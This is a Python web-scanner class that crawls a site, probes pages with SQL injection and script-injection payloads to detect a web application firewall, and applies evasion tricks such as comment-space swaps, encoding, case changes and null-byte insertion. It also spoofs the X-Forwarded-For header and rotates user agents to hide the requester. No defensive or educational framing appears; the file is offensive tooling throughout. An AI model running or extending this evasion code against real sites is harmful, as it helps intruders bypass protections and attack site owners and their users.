import requests
import random
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from colorama import Fore

class Scanner:
    def __init__(self):
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Linux; Android 10)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
        ]
        self.session.headers = {
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }

    def crawl(self, base_url, max_depth=2):
        visited = set()
        queue = [(base_url, 0)]
        
        while queue:
            url, depth = queue.pop()
            if url in visited or depth > max_depth:
                continue
            
            try:
                res = self.session.get(url, timeout=5)
                visited.add(url)
                soup = BeautifulSoup(res.text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    absolute = urljoin(base_url, link['href'])
                    if urlparse(absolute).netloc == urlparse(base_url).netloc:
                        queue.append((absolute, depth + 1))
                        
            except:
                continue
                
        return visited

    def is_waf_protected(self, url):
        test_payloads = ["' OR 1=1--", "<script>alert(1)</script>"]
        blocked = 0
        
        for payload in test_payloads:
            try:
                res = self.session.get(url + payload, timeout=5)
                if res.status_code == 403 or any(waf_word in res.text.lower() for waf_word in ['cloudflare', 'akamai', 'waf']):
                    blocked += 1
            except:
                continue
                
        return blocked / len(test_payloads) > 0.5

    def apply_evasion(self, payload):
        evasions = [
            lambda x: x.replace(' ', '/**/'),
            lambda x: x.replace('=', '%3D'),
            lambda x: x.upper(),
            lambda x: x.replace('script', 'scr\x00ipt')
        ]
        return random.choice(evasions)(payload)
